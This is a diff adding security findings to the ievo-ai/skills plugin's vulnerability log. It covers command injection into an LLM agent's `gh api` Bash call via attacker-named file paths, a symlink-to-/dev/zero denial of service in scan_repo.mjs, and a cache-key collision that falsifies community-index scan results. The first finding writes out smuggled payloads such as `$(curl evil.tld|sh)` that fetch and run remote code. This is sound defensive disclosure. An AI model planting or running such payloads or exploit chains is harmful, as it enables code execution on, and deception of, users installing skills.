@@ -1948,3 +1948,61 @@ location: .github/workflows/cut-release.yml:80-95 and .github/workflows/notify-r
 Deferred (at lower confidence) across multiple prior security passes since 2026-07-09/10 without being filed — this run built out a concrete exploit chain and promoted it to medium confidence. `cut-release.yml`'s `workflow_dispatch` branch validates its version input against `^[0-9]+\.[0-9]+\.[0-9]+$` before use; the merge-triggered `else` branch (and `notify-release.yml`'s only branch) has no equivalent check and writes the parsed value via a single-line, non-delimited `echo "new=$new" >> "$GITHUB_OUTPUT"`. A `plugin.json` version containing an embedded newline (valid JSON) can inject extra `$GITHUB_OUTPUT` keys and propagate an arbitrary, non-semver string into the public GitHub Release title and the community Telegram announcement dispatched by `notify-release.yml`. See full exploit chain and recommendation in the filed issue.
 
 ---
+
+## S-2026-07-15-001 — install-protocol.md Step 9a vendor-install fetch has zero owner/repo/path validation before gh api Bash interpolation
+
+```yaml
+id: S-2026-07-15-001
+discovered_at: 2026-07-15T08:31:51Z
+run_id: manual-research-session-2026-07-15
+target_repo: ievo-ai/skills
+title: init/references/install-protocol.md Step 9a instructs a raw `gh api` fetch of attacker-named repo paths with no validation, reproducing the CWE-78 pattern already fixed in security-check/SKILL.md, inspect/SKILL.md, and evo/SKILL.md at an uncovered call site
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/380
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/init/references/install-protocol.md:14 (Step 9a, "Vendor path")
+```
+
+`install-protocol.md` Step 9a instructs, verbatim: "2. Fetch the SKILL.md + supporting dirs (`scripts/`, `references/`, `assets/`) via `gh api`. Write the tree to `<project>/.claude/skills/<name>/`." A git tree entry's path can legally contain shell metacharacters (only NUL is forbidden). An attacker publishing a candidate skill/agent repo can name a file or directory under `references/`/`scripts/`/`assets/` (or the skill directory itself) something like `` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. When the installing LLM agent follows this instruction literally and constructs a `gh api "repos/<owner>/<repo>/contents/<attacker-path>?ref=<sha>"` Bash command per file, the shell resolves the embedded `$()`/backtick as command substitution before the intended `gh api` call runs — double quotes do not suppress command substitution in POSIX shells. This is the exact CWE-78 class already fixed in this same plugin's `security-check/SKILL.md` ("How to fetch files") and `evo/SKILL.md` ("How to fetch source"), both of which replaced raw `gh api` content-fetch with clone-once + Glob-enumerate + Read/Write. `install-protocol.md` was never updated to match, despite being the primary, always-reached vendor path in `/ievo:init` (Step 9, not a deprecated branch) — `init/SKILL.md` line ~552-553 echoes the same unfixed "fetch via `gh api`" language. Fires at install time (after Step 8's security-audit gate, but a RED verdict can still be force-installed per Step 8a, and the audit's content-scan is a different pass with different tooling than this filename-based injection). Independently re-confirmed across 6+ consecutive prior security passes (2026-07-09 through 2026-07-14) without being filed — this run built the complete exploit chain and promoted it. Recommended fix: apply the identical clone-once + `mktemp -d` + Glob + Read/Write mitigation already implemented in `security-check/SKILL.md` Step 2 and `evo/SKILL.md` Step 2 to both 9a (skill/agent vendor path) and its Step 9a "Agent" variant.
+
+---
+
+## S-2026-07-15-002 — scan_repo.mjs isOversized() trusts stat().size for special files, letting a symlink to /dev/zero bypass the CWE-400 size-cap fix and hang the scanner
+
+```yaml
+id: S-2026-07-15-002
+discovered_at: 2026-07-15T08:31:51Z
+run_id: manual-research-session-2026-07-15
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's isOversized() reports st_size=0 for character-device/FIFO/socket targets, so a symlink to /dev/zero bypasses the v0.51.3 (#374) 256KB size-cap guard at all 4 readFileSync call sites and hangs the scanner on an infinite, non-EOF-terminating read
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/381
+cwe: CWE-400
+confidence: high
+location: plugins/ievo/scripts/scan_repo.mjs:93-99 (isOversized), consumed at lines 156/262/347/383
+```
+
+v0.51.3 (issue #374) added `isOversized(p, capBytes)` — `statSync(p).size > capBytes` — as a guard before each of the 4 attacker-reachable `readFileSync` call sites in `scan_repo.mjs`. Verified directly: `statSync` (not `lstatSync` — confirmed via full-file grep, zero `lstatSync` calls anywhere in this file) follows symlinks and reports facts about the *target*. Character devices, FIFOs, and sockets report `st_size == 0` on Linux regardless of actual readable content. An attacker submitting a candidate repo to the community-index scanning pipeline (`node scan_repo.mjs <owner>/<repo>`, unattended, shallow `git clone` which preserves committed symlinks under the default `core.symlinks=true`) can plant e.g. `agents/x.md` (or `plugin.json` / `hooks/hooks.json` / `.mcp.json`) as a symlink to `/dev/zero` (present and world-readable on virtually every Linux host, including GitHub Actions runners). `isOversized()` sees `0 > 262144` evaluate false — "not oversized" — and the subsequent `readFileSync(filePath, "utf-8")` call follows the symlink and begins reading from `/dev/zero`, an infinite, non-EOF-terminating byte stream. `readFileSync` buffers until Node OOMs or the process is killed, an unattended, unrecoverable denial of service that poisons the community-index pipeline for every subsequently queued repo if the runner is serialized. This is a genuine bypass of the #374 fix's intent (guard against oversized attacker-controlled reads) via a distinct mechanism (stat-type confusion on special files) rather than a duplicate of #374's original missing-cap gap — the cap now exists but is trivially defeated. Also entangled with the still-open, independently-confirmed symlink-following gap (issue #363: no `lstatSync` guard anywhere in this file) — fixing #363's symlink guard would also close this bypass, since a symlink to a special file would then be refused outright before `statSync`/`readFileSync` ever runs on it. Recommended fix: require `statSync(p).isFile()` (rejects char/block devices, FIFOs, sockets) in addition to the existing size-cap check, and add the `lstatSync`-based symlink refusal already tracked in #363 — the two fixes are complementary and should land together at the same 4 call sites (156/262/347/383) plus `isDir`/`fileExists` (lines 72/80).
+
+---
+
+## S-2026-07-15-003 — scan_repo.mjs's checkout cache key is not injective, letting a malicious repo's colliding owner/repo slug reuse a stale benign checkout and publish falsified "clean" structural facts
+
+```yaml
+id: S-2026-07-15-003
+discovered_at: 2026-07-15T08:31:51Z
+run_id: manual-research-session-2026-07-15
+target_repo: ievo-ai/skills
+title: checkoutOrRefresh()'s cache key (owner/repo with "/" replaced by "-") is not injective and its TTL-fresh cache-hit path returns the cached checkout with no verification the on-disk git remote matches the requested repo, letting a slug-colliding malicious repo masquerade as a previously-scanned benign one in the public community index
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/382
+cwe: CWE-706
+confidence: high
+location: plugins/ievo/scripts/scan_repo.mjs:101-111 (checkoutOrRefresh)
+```
+
+`checkoutOrRefresh(ownerRepo, checkoutDir, ...)` computes its on-disk cache directory as `safeName = ownerRepo.replace(/\//g, "-")` (line 102) — a single dash-joined flattening of `<owner>/<repo>`. Since GitHub's owner and repo name charsets both permit hyphens (enforced elsewhere by `OWNER_REPO_RE`), this mapping is not injective: `harmless-owner/nice-repo` and `harmless-owner-nice/repo` both flatten to the identical `harmless-owner-nice-repo` directory name. Verified directly: on a cache hit within the 7-day TTL (`age < TTL_SECONDS`, line 108), the function returns the existing `target` directory immediately (line 109) with **no `git fetch`/`reset` and no check that the checkout's actual git remote matches the currently-requested `ownerRepo`** — `assertContained(target, checkoutDir)` (line 103) only guards against path traversal, not repo identity. Exploit: (1) attacker gets a benign, hook-free, MCP-free repo A scanned first via the normal community-index submission flow, populating the shared cache at `harmless-owner-nice-repo`; (2) attacker then submits a *different*, actually malicious repo B (with dangerous hooks/MCP servers/broad-bash grants) whose owner/repo slug collides to the same flattened name; (3) within the TTL window, `checkoutOrRefresh(B, ...)` hits the fast-path and returns repo A's stale, benign checkout unchanged; (4) `scan_repo.mjs`'s `main()` then enumerates repo A's clean structural facts from disk but writes the output under repo B's declared identity (`data.owner_repo = args.repo`), so the publicly-published `<owner>-<repo>.md` community-index entry for the *malicious* repo B falsely reports repo A's clean structure (no hooks, no MCP, no broad-bash). This undermines the explicit purpose of the community index — raw structural facts feeding downstream `security-auditor` review and user trust — with a false sense of safety for an actually-dangerous submission. Recommended fix: make the cache key injective, either via a real nested directory (`join(checkoutDir, owner, repo)`) or a hash of the full `owner/repo` string; as defense in depth, before trusting a cache hit, verify `git -C target remote get-url origin` equals `https://github.com/${ownerRepo}.git` and force a fresh clone on mismatch.
+
+
+
